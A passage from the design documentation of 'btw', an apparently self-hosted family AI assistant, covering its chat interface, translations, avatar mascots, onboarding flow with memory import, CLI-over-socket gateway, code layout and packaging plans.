  download is still the original. Elsewhere they are shown as downloads. Width and height (with
  EXIF rotation applied) are read from the file header, so the chat reserves the space before a
  picture loads and stays scrolled to the bottom.
- **Serving:** `GET /api/c/<conversation>/media/<id>` checks that the user belongs to the
  conversation's profile and serves the copy by its random id; it never takes a path. Pictures are
  sent inline and everything else as an attachment; `?download` sends the original. Responses
  carry `nosniff`, a sandboxing CSP (an SVG opened in its own tab can't run script) and an
  immutable cache header.
- **The chat only loads btw's copies.** The Markdown renderer swaps each target for its copy: a
  picture (click to open a viewer with a Download button), a download card for files and for
  pictures browsers can't show, or a pulsing placeholder while the reply is still streaming.
  DOMPurify drops any other `<img>` source, `<style>`, inline styles, `srcset`, audio, video and SVG
  images, so the browser never loads anything a reply names from another site without a click. The
  gateway's own downloads are what the two rules above guard.
- **Cleanup:** `media` rows go with their conversation. The scheduler's hourly prune deletes stored
  files that no row points to any more and that are over an hour old (so a copy about to be saved
  is safe). Identical files are stored once.
- The notification menu shows pictures as `[their description]` and file links as their label.

## Web UI

It follows the ChatGPT app: a sidebar with chats, a centered column of messages, and a rounded
composer. Most of the family doesn't read shell, so the default view hides the machinery.

- **Components** are [shadcn-svelte](https://shadcn-svelte.com) (Luma style, neutral base) in
  `src/lib/components/ui`, generated by its CLI and owned by the repo; `components.json` records the
  settings. Colors are CSS variables in `src/routes/layout.css`, with a dark theme
  (`mode-watcher`: system, light or dark). The fonts, Figtree and Fira Mono, are bundled from
  Fontsource and served by the app, so they don't depend on the OS or a font CDN.
- **Replies** are built by `buildTranscript` (`src/lib/transcript.ts`): text blocks are shown as
  Markdown (`marked` + DOMPurify), and every run of thinking and commands between two texts is one
  collapsible group, "Worked for 12s" when done and a live "Thinking" / current step while running.
  Durations come from row timestamps, so they're approximate. The profile's assistant avatar sits at
  the top left of each reply: in the margin when the chat is wide, on its own line when it isn't.
- **Steps** show the `summary` and `icon` the model wrote with each `run_command` call ("Checking
  tomorrow's weather in Berlin" with `cloud-sun-rain`), in the conversation's language. Opening a
  step shows the command and its output. Calls from before summaries existed say "Ran a command".
  Any Lucide icon works: `/api/icons/<name>` serves one icon's drawing from the `lucide` package, so
  pages don't download all two thousand; unknown names fall back to a terminal icon.
- **Technical details** (Settings, per device, in the `btw-prefs` cookie so the server renders it
  too) switch the labels to the raw commands and add context size, prompt-cache hit rate, cache
  misses, per-reply token usage and the model that wrote each reply. "Always show steps" opens the
  groups by default.
- **The composer** is docked over the end of the chat and of the Images grid (`ComposerDock`):
  what scrolls under it fades and blurs into it instead of stopping at an edge, and the scroll
  area pads its end by the composer's height so the newest message still clears it.
- **New chat** is the empty composer: the first message creates the conversation and is sent in
  the same request. Model and reasoning are picked from the chip in the composer: the model starts
  at the default preset, reasoning at the level last used on this device. In an existing chat both
  can change (see [Switching models](#switching-models)). The folder chip next to it starts the
  chat in a folder.
- **Suggestions** under the new-chat composer (`packages/core/src/suggestions.ts`) come from the
  profile's memory, and each member gets their own. Until it has any, they are four general ones
  (a reminder, a weather check, finding a file, free disk space). After that, the default preset is
  asked, with `quickReply`, for four things the person looking at the page might ask btw, each built
  on something in the notes, preferably about them or what they take part in, written as they
  would write it and in the notes' language: a label, a Lucide icon and the text the chip puts in
  the box. It gets today's date, the person's name and the notes, the core note first and then the
  most recently changed, up to 12,000 characters. Each member's are saved in
  `memories/.suggestions.json` under their user id, with a hash of the notes and their name, so
  the page only asks again when memory changed, they were renamed, or theirs are a week old; that
  is one call per member who opens the page, not one per profile. Someone's that weren't made again
  in 90 days are dropped, most likely a member who left. The page renders the saved ones (or the
  general ones) at once and, when they are stale, fetches `/api/p/<slug>/suggestions`, which waits
  for the model, then swaps them in. One call per member runs at a time; a failed one keeps the old
  chips and isn't retried for the same memory for 15 minutes. Anything in memory can show up in
  anyone's chips, which is no more than the Memory page already shows every member.
- **The sidebar** lists folders above the chats. A folder's chats show under it when its page or
  one of its chats is open, or when its icon (a chevron on hover) is clicked; chats in folders are
  not in the Chats list. A chat btw is working in shimmers like the "Thinking" label, for everyone
  in the profile: the sidebar listens on `/api/p/<slug>/running` (SSE), which sends the ids of the
  profile's running chats on connect and whenever an agent loop starts or stops.
- **Chat titles:** the first message stands in until the chat's model names it, in the background.
  Anyone in the profile can rename a chat from its menu (the sidebar's, or the chat header's). The
  new name reaches everyone who has the chat open, doesn't move it up the list, and isn't replaced
  by a name the model was still thinking of.
- `/` redirects to the last profile opened (`btw-profile` cookie) or the only one, else to
  `/profiles`.
  Creating a profile there opens its [welcome](#welcome).
- **Models & keys** (`/admin`, admins only) has the API keys and the model presets. A key is
  write-only: the page shows where the key in use comes from (btw's config or an environment
  variable) and its last four characters, never the key. A new one is checked with its provider
  first (listing models, which is free), then saved to `config.json`, which is read on every
  request, so it applies without a restart. A key the provider rejects isn't saved; one that works
  on an account with a problem (out of credit, a restricted OpenAI key that can't list models) is,
  with the provider's words. OpenRouter lists its models for anyone, so its key is checked with `GET
/key` instead. Removing a saved key falls back to the environment's. Replacing a key warns to keep
  the same workspace (Anthropic, OpenRouter) or project (OpenAI): pictures and PDFs already sent
  live in it. `btw key set` does the same check, but saves anyway when the provider can't be
  reached. Under the keys, **Plans** lists both plans alike (what each is, who it's signed in as,
  what to do next): the Claude plan's row shows where Claude Code is and checks its sign-in; the
  ChatGPT plan's shows where Codex is and who it's signed in as, signs it in with ChatGPT, showing
  the link and the one-time code, updates by itself once the code is entered, and then offers Sign
  in again and Sign out. Without the agent, a row shows how to install it. Under the presets, **Add
  a model** opens the form (open from the start while there are none), in the order the choices are
  made: the provider, saying which key or plan it runs on; the model, picked from the provider's
  list or typed (any id works, a dated snapshot say); an optional name, whose placeholder is the
  default it gets; and the context window, folded away under what it will be ("Auto · 1M"). The list
  comes from `/api/models` when the form needs it: Anthropic's models API, with names and windows;
  OpenAI's, only GPT-5.6 and newer (its current generations in September 2026; older ones can still
  be typed), without audio, realtime, pictures or search, nor dated snapshots of models also listed
  without a date, the newest first, with the flagships' known window; OpenRouter's, the models that
  can call tools (without `:batch` variants, which are for its batch API), the newest first, with
  its names and the window a preset gets; Claude Code's own list for the Claude plan, by full id
  (`claude-opus-5-5`, not `opus`, which would move a chat to a newer model when Claude Code
  updates); and what Codex's own picker offers for the ChatGPT plan. It's asked for again when the
  provider's key changes. The context window is a row of chips: Auto (what the provider reports, if
  anything), 128K, 200K, 1M, or Custom, typed as `272k`, `1.5m` or `272000`. The provider checks the
  model id before the preset is saved.
  **Edit** on a preset opens the same form in its row, filled in (`editPreset`; the CLI has
  `btw preset edit`). Only a new provider or model is checked with the provider, so renaming or
  setting the window needs no key; a name left as the default follows the model. New chats,
  automations that use the preset and chats switched to it from then on get the change; chats
  already on it keep the copy they took (see [Switching models](#switching-models)).

## Languages

The interface comes in English, Russian, German, Spanish and French. Only the interface: what
people write, btw's replies, the steps' summaries (the model writes those in the conversation's
language), chat titles and everything that reaches the model stay as they are, so the prompt and
its cache never depend on someone's settings. btw already answers in the language it's written to.

- **Picking one.** Settings has Language, per device in the `btw-prefs` cookie like the other
  settings: a language, or "Same as the browser" (the default), the first language in the
  browser's `Accept-Language` that btw has, else English. `hooks.server.ts` works it out for every
  request (`locals.locale`), so server-rendered pages, `<html lang>` and form messages match, and the
  sign-in page is in the browser's language too. Picking another language reloads the page, since
  some of what's on it was written by the server.
- **Messages** are in `src/lib/i18n/messages/<locale>.ts`, one object per language grouped by page.
  English is the source: the others are typed as its shape, so a missing key or a wrong parameter
  fails `pnpm check`, and `i18n.test.ts` checks that each has English's `{slots}`. Messages with
  values in them are functions (`workedFor: (duration) => …`), so each language puts the value where
  its grammar wants it and picks plural forms with `Intl.PluralRules` (`plural.ts`; Russian has one,
  few and many). Sentences with markup in them (a link, a name in bold, a command) are strings with
  `{slots}` that `Rich.svelte` fills with snippets: a translation moves the link, not the markup.
- **In code.** Components get `{ m, locale, intl }` from `getI18n()`, which the root layout sets;
  server loads and actions use `translations(locals.locale)`. Helpers that make text
  (`formatAgo`, `formatBytes`, `activeStepLabel`, the copy buttons and file cards `renderMarkdown`
  adds, upload errors) take the messages as a parameter. Dates and numbers go through `Intl` with
  `intl`, which is British English for English so dates still read "28 Sept".
- **Schedules** on the Automations page: core's `parseCron` takes a cron expression apart (which
  days, which months, which times) and each language words that with its own grammar in
  `automations.describe`: "По понедельникам и средам в 09:00", "Montags bis freitags um 07:30
  Uhr". English is core's `describeSchedule`, as before. Day names come from `Intl`.
- **The emoji picker** gets its labels (emoji-picker-element's translations) and emoji names and
  search words (emoji-picker-element-data in the language, served by btw) in the language too.
- **What stays as it is.** Image templates' names, sentences and choices (they are the prompt the
  chat gets) and the "Make an image:" message, skills' descriptions, memory notes' names,
  notifications (the agent writes them), and errors that come from core, since the CLI and the
  agent share them. The general suggestions under a new chat's box (before a profile has memory)
  are in the interface's language: they are the start of a message for the person to finish, like
  typing it. The ones btw makes from memory are in the family's language, like the notes.
- **Adding a language.** Copy `en.ts` to `<locale>.ts` and translate it, `automations.describe`
  included (`ru.ts` shows one with grammatical cases); add the code to `LOCALES` and its own name to
  `LANGUAGE_NAMES` in `locales.ts`, and the messages to `MESSAGES` in `src/lib/i18n/index.ts`; give
  the emoji picker its data in `EmojiChip.svelte`. TypeScript points at anything left out.

## Assistant avatars

Each profile's assistant has a small mascot: one of eight one-color glyphs (probe, campfire, lantern,
planet, quantum, comet, moon, satellite), redrawn by hand as SVG from a concept sheet. It shows next
to every reply, large on the new chat screen, in the profile switcher and the profile list, on
notifications, and as the tab icon of the profile's pages. People keep `UserAvatar`, their initial
on a colored circle.

- **Drawing.** `packages/core/src/avatars.ts` has the names and the glyphs: shapes on a 24×24 grid
  filled with `currentColor`, with no strokes or second tone. Eyes and other details are holes
  knocked out with a mask, so the page shows through in both themes, and the eyes are shapes of
  their own so they can move. `AssistantAvatar.svelte` (`avatar`, `mood`, `size`) draws one. Each
  avatar's color is a `--avatar-<name>` variable in `layout.css`: the dark value is the concept
  sheet's, the light one the same hue at least 3:1 on white, the sidebar and bubbles. The tab icon
  reads both from the file and follows the system's theme, like the tab strip.
- **Choosing.** A new profile gets the avatar its slug picks (`defaultAvatar`, a hash of the slug),
  so profiles differ without anyone choosing. The migration that added `profile.avatar` gave
  existing profiles theirs the same way, in SQL. Any member changes it on People & profile, or with
  `btw profile avatar <name>`, which the agent runs when asked ("switch to the comet"; the
  `btw-agent` skill explains it). The picker there (`AvatarPicker.svelte`) is laid out like a
  character select: the pick up close on a starry stage lit in its color, which pops in with a
  squash when it changes, next to the roster, whose tiles take their avatar's color and show its
  working motion on hover.
- **Tint.** A profile's pages take on its avatar's hue: `src/lib/tint.ts` gives the page, sidebar,
  bubbles, hover and (in dark) card, menu and composer greys a little OKLCH chroma in the avatar
  color's hue, at each grey's own luminance, so text and avatars keep their contrast. The root
  layout renders it into the head as a `<style>` that outranks `layout.css`, so the first paint and
  menus portaled to `<body>` are tinted too, and a new profile or avatar swaps it in place.
  See-through borders and inputs take the tint from what's under them; light cards, menus and the
  composer stay white, a step above the page. The `theme-color` meta follows the tinted page. Pages
  outside a profile (sign-in, the profile list, Models & keys) keep the plain greys.
- **Moods.** Only the avatar on the newest reply moves; older ones hold still. It follows what the
  chat already knows: `thinking` while the model streams (eyes up, a gentle bob), `working` while a
  command runs (a busy hop, and the avatar's own motion: the flame flares, the antenna blinks,
  quantum's dashes flicker), `waiting` while messages are queued behind the turn (a slow pulse),
  `blocked` on an API error or when Continue is shown (drooping eyes, a muted color), `done` for a
  moment after a turn (a squash), then `idle` (an occasional blink). Hovering it shows the current
  step in the step list's words. It's CSS animation only; with reduced motion each mood keeps its
  pose and nothing moves.
- **Live.** A new avatar or name reaches open pages: `/api/events` pings the profile's members and
  the page loads its data again. The CLI changes the database from another process, so the gateway
  also looks for changes after every command and on each scheduler tick.
- **Not for the model.** The avatar and the mood never reach it: nothing goes into the system
  prompt, the tool or the request, so caching is untouched. Only the `btw-agent` skill's description
  mentions avatars, so new chats know the command.

## Welcome

Creating a profile opens its welcome, `/p/<slug>/welcome`: an intro in space, then one question per
screen, like Arc's first launch, and the profile's first chat. It sits outside the profile's
sidebar layout (`+page@.svelte`). Each step saves as it's answered, so leaving halfway loses
nothing, and opening the page again runs it again.

- **The idea: everything is a dot.** A star draws the wordmark, whose three trailing dots type,
  then fly out as the eight avatar colors, orbit like planets and pool into an aurora behind the
  questions. One of those colors
  becomes the assistant. Imported memories fly into the Memory page's dot grid, and the grid
  gathers into the avatar as the new-chat page opens.
- **Intro** (`Wordmark.svelte`, `IntroSky.svelte` in `src/lib/components/welcome`). Space, after
  Outer Wilds, timed to a song (`music`): dark whatever the theme, stars coming out over faint
  nebulae and a galaxy band on a canvas, the camera drifting slowly into them, one shooting star.
  At nine seconds a star at the middle of the screen brightens and sweeps across the letters,
  which appear behind it (the logo's own path from `logo.svg`, revealed with a clip-path), and
  lands as the first dot. The three dots bounce like a typing indicator and burst into eight
  planets in the `--avatar-*` colors of the page's theme, each on its own faint orbit around the
  letters, the inner ones faster. Then they melt into soft blobs, and as the song lifts (23.6 s)
  space gives way to the page like a sunrise (a dark page keeps a few stars) and the welcome
  comes up. A click or Esc skips it, and with reduced motion it opens on the welcome.
- **A model, only when there is none** (`ModelStep.svelte`). Five cards: the Claude plan, the
  ChatGPT plan, and an Anthropic, OpenAI or OpenRouter key. A key is checked and saved as on Models
  & keys (a key already set skips pasting); a plan's sign-in is checked, and when its agent isn't
  installed or signed in the step says what's wrong and points to Models & keys, where the sign-in
  lives. Then chips with the provider's first six models (or a typed id) make the first preset,
  which becomes the default. Only admins can add one; anyone else is told to ask and carries on.
- **The avatar.** `AvatarPicker` in its big layout, starting on the avatar the slug picked. A
  tile only previews; "This one" saves it. The page then takes on the avatar's tint, which grows
  as a circle from the avatar (a view transition with a `clip-path` animation), while the avatar
  bounces and says hello. The welcome's load returns no `profile`, so the root layout doesn't
  tint it before then; the page renders the tint itself once it's chosen.
- **Memories from another assistant** (`MemoryStep.svelte`). People copy a prompt (`EXPORT_PROMPT`
  in `packages/core/src/memory-export.ts`) into ChatGPT, Claude or Gemini, which answers with a
  code block of dated lines under five headings (Instructions, Identity, Career, Projects,
  Preferences), and paste the answer. The same parser counts the sections under the box while
  they paste, and runs again on the gateway before anything is saved. Inside a code block every
  line under a heading counts; without one, only dated lines and list items do, so the
  assistant's own sentences stay out. An answer that doesn't follow the format goes to the
  default preset with `quickReply`, told to only rewrite it and to treat it as data. "Start
  fresh" skips to the fresh start.
- **Where they go** (`importMemoryExport`, `memory-import.ts`). A profile is shared, so rules are
  pinned in `core.md` with the person's first name ("Jamie: keep answers short"), and what
  doesn't fit its 4,000 characters goes to their own note. Identity, career, preferences and
  anything under another heading go to `people/<name>.md`, a heading each; each project to
  `projects/<name>.md`, named by the entry's first words ("Tidepool: …"), or to `projects.md`.
  `addMemoryFacts` adds them under the heading, skips facts memory already has, and dates each
  one as the export did in `.facts.json`; `[unknown]` ones get 0, like facts from before dates
  were kept, so the Memory page shows them lightest.
- **Memories arrive** (`MemoryArrival.svelte`), slowly, to the song's last phrase. The saved
  facts show as lines, coming in one after another; on the phrase's second bar each becomes a dot
  that arcs from its line to its place in a grid laid out like the Memory page's (one row per
  note), landing at full strength and fading to its age. The count ticks up with them. As the
  phrase turns, the dots drift along curves into the avatar, which glows brighter with each. Then
  the page goes to `/p/<slug>`: a view transition names the avatar on both pages
  (`btw-assistant`), so it glides into its place over the composer while the page gives way over
  two seconds (`html.btw-arrive`), landing on the song's last note.
- **A fresh start** (`FreshStart.svelte`), for "Start fresh" or an import that added nothing: an
  ending too, to the same last phrase. The avatar bounces in, the eight colors from the intro come
  out around it as planets on faint orbits (behind it on the far side, in front on the near one),
  "A fresh start." comes up on the second bar, and as the phrase turns they spiral into the
  avatar, which glows with each, before the chat opens as after the memories.
- **Sounds** (`src/lib/welcome/sounds.ts`). A song, and a sound only where the screen moves by
  itself; clicks are silent. The song (`music`) plays the intro, rising out of silence with the
  stars; once the welcome waits it plays on much quieter under the questions (`duck` to `UNDER`),
  going round for as long as they take. When the memories arrive it jumps to its last phrase at
  full level (`lastPhrase`, 179.8 s in, with its bars in `PHRASE`) for both endings, and ends by
  itself over the new chat. It streams through a media element in the Web Audio graph, so
  three and a half minutes of music are never decoded at once. The short sounds are `confirm`
  (a key or plan check passes), `wash` (the avatar's tint washing in) and `yap`: a small animal's
  shout when an avatar is picked or the big one poked, sped up, on a different note of a pentatonic
  scale (`NOTES`) each click, whichever the avatar. Each sound is a file in
  `src/lib/assets/sounds/welcome` (`<name>.mp3`), bundled through `import.meta.glob` (where each
  came from is in `CREDITS.md` next to them); one without its file is silent. The screen waits
  for the song to start, up to a second and a half; one that can't start on time (still loading,
  or the page not allowed sound yet) joins as soon as it can, that far in, and a short sound that
  late is dropped. Browsers only play sound after a click: creating the profile is one, and the
  welcome is a client-side navigation from there; opened some other way, the song joins in at the
  first click. The Sounds setting (per device, in `btw-prefs`) and the speaker button on the
  welcome turn them off; turned back on, the song goes on where it was.

## Running `btw` in the gateway

The agent runs `btw` all the time (`btw view`, `btw memory show`, `btw agent watch`, …), and each
run used to start Node and load all of btw: about 150 ms from the bundle and 650 ms from a source
checkout. Now the gateway, which has btw loaded already, runs the command, and `btw` only asks it
to (issue #42).

- **The socket** is `~/.btw-agent/run/cli.sock`, in a folder only this user can open (mode 700,
  the socket 600), so it adds no one who couldn't already read `btw.db`. It isn't the web port,
  which is public through the tunnel. `serve.ts` starts it from `hooks.server.ts`; it replaces a
  socket left by a gateway that was killed, but never takes over from another gateway still
  answering on it.
- **The protocol** (`protocol.ts`) is one JSON message per line. `btw` sends the arguments, its
  folder and its environment; the gateway runs the command with them as its `io` (see
  [Code layout](#code-layout)), streams stdout and stderr back and ends with the exit code. Stdin
  goes over only when the command reads it, so a command that doesn't never waits on it.
- **What stays local.** `setup`, `start`, `service` and `init` always run in their own process,
  and so does any command typed at a terminal (stdin is a TTY), since it may ask something. The
  agent's commands and automation scripts have no terminal, so theirs go to the gateway.
- **Falling back.** When nothing answers on the socket (no gateway, or the one that left it was
  killed), or the gateway speaks another protocol version (`PROTOCOL`), `btw` loads btw and runs
  the command itself, as before. Once the gateway has a command, `btw` never runs it again, even
  if the gateway goes away in the middle ("the gateway stopped before the command finished", exit
  1): it may have done part of it, like a `btw memory add`.
- **Stopping.** `btw` hanging up (its command's timeout, or Stop) aborts the command's signal, which
  ends a `btw agent watch` or `btw generate image`. The socket never keeps the gateway running by
  itself, and on adapter-node's shutdown it closes and drops the commands still running, whose
  `btw` then says the gateway stopped.
- **Costs.** `dist/cli.js` holds only the client (3 KB): esbuild splits the rest of btw into
  `dist/chunks`, loaded only to run a command locally. Through the gateway, `btw` takes about
  50 ms from the bundle (Node alone takes about 25) and 100 ms from source. A command now runs
  in the gateway's process, so the gateway serves the help text built when asked (the image model
  may have changed since it started), and a slow command would briefly hold up its event loop;
  image conversion runs in a child process, so `btw view` doesn't.

## Code layout

```
packages/core   @btw/core. Schema + migrations, config, skills, prompt, run_command, background
                commands, memory notes (and memory-export.ts, memory-import.ts: memories brought
                over from another assistant), new-chat suggestions, btw view images, attachments, model
                calls (models.ts, with anthropic.ts, openai-chat.ts and openrouter.ts, each with its
                Files API and the function that turns btw's format, format.ts, into its request),
                plans (plans.ts: the Claude plan's turns through Claude Code in claude-plan.ts, the
                ChatGPT plan's through Codex's app server in chatgpt-plan.ts and
                codex-app-server.ts), provider
                file cache, runner, media, users/profiles/presets, API
                keys, chat folders, triggers, scheduler, subagents (subagents.ts, and
                subagent-host.ts in the gateway), notifications, image generation (providers:
                openai.ts), image templates and assistant avatars.
                Built-in skills in packages/core/skills, built-in templates in
                packages/core/image-templates. Plain TypeScript run by Node with type stripping
                (no enums or parameter properties; imports use .ts extensions).
packages/cli    btw: setup, start, service, config, key, claude-plan, chatgpt-plan (plans.ts), env,
                user, preset, profile, skill, trigger, wake, view, memory, generate, agent. `runCli(argv, io)` in run.ts runs a command and returns
                its exit code; index.ts calls it with this process's io. Commands print, read stdin,
                the environment (BTW_PROFILE, …) and the working folder only through `io` (io.ts),
                never `process`, and end in an error rather than `process.exit`, so the agent's
                commands can run inside the gateway: index.ts asks it first (client.ts, over
                protocol.ts), and serve.ts is the gateway's side. setup, start and service stay in a
                process of their own: they prompt at a terminal, run the gateway or manage its
                service.
src/            SvelteKit gateway (adapter-node). @btw/core is bundled into the server build.
                UI components in src/lib/components (shadcn-svelte primitives in ui/, a new
                profile's welcome in welcome/, its sounds in src/lib/welcome), the interface's
                languages in src/lib/i18n.
scripts/        build-cli.mjs bundles the CLI and core into dist/cli.js with esbuild.
```

Core finds the package root by walking up to the `package.json` named `btw-agent`. That works
from source, from the SvelteKit build and from the bundled CLI, and gives the paths to the
migrations, `build/index.js` and the CLI entry.

## Distribution

Published to npm as `btw-agent` (not yet). `npm install -g btw-agent` gives the `btw` command.

- The package ships `build/` (the web app), `dist/cli.js` with its `dist/chunks`,
  `packages/core/drizzle`, the built-in skills in `packages/core/skills` and the built-in image
  templates in `packages/core/image-templates`. Its only runtime dependency is `better-sqlite3` (a
  native module with prebuilt binaries). Everything else is bundled. Node won't strip types inside
  `node_modules`, which is why the CLI ships as JavaScript.
  Claude Code itself isn't shipped (see [The Claude plan](#the-claude-plan)); the Agent SDK and
  zod, which core loads on first use, are in chunks of their own.
- `btw setup` is the first-run wizard: config, API key (or, with `--provider <plan>`, the plan's
  agent and its sign-in), admin account, default preset, public URL.
- `btw start` reads host, port and origin from `config.json` (default `127.0.0.1:5780`), sets
  `HOST` / `PORT` / `ORIGIN` for adapter-node and imports `build/index.js`.
- `btw service install` writes a LaunchAgent (`~/Library/LaunchAgents/dev.btw-agent.gateway.plist`)
  that runs `node dist/cli.js start` with `KeepAlive` and logs to `~/.btw-agent/logs/gateway.log`.
  It's a LaunchAgent, not a LaunchDaemon, so commands run as the user. It records the absolute
  node path, so switching Node versions needs a reinstall.
- On shutdown, the gateway kills the process groups of commands that are still running.
- Remote access is the user's tunnel (Tailscale Funnel, Cloudflare Tunnel, a VPS). The gateway only
  binds to localhost by default.
- macOS privacy (TCC): the background `node` process needs Full Disk Access to reach Documents,
  Desktop, Photos and Mail. Setup prints the path. Granting it applies to everything that node
  binary runs.

## Not done yet

- **Compaction.** The context window is already stored on each conversation and shown in the UI.
  The next step is server-side compaction (beta `compact-2026-01-12`), triggered at about 85% of the
  window.
- Other chat providers (Gemini). See [Model providers](#model-providers) for what each needs.
- OpenRouter: provider preferences (`provider.order`, data policy), and PDFs for models that don't
  read them, through OpenRouter's parser with its annotations sent back so a PDF is parsed once.
- The Claude plan: deleting a chat's Claude Code session with the chat (the SDK has
  `deleteSession`); messages sent mid-turn joining at Claude Code's next step (its input stream
  takes them) rather than after the turn.
- Other image providers (OpenRouter, fal, Higgsfield): a module each next to `openai.ts` and an entry
  in `PROVIDERS`, plus one in `API_KEYS` (config.ts) and a check request in `api-keys.ts`.
- Smart approval mode.
- Refusal fallbacks (`fallbacks: "default"`) for models that support them. Refusals are shown in the UI today.
- Push notifications (Web Push) for the bell. Today it only updates while a page is open.
- A `btw notify` command for scripts that only need to say something, without waking the agent.
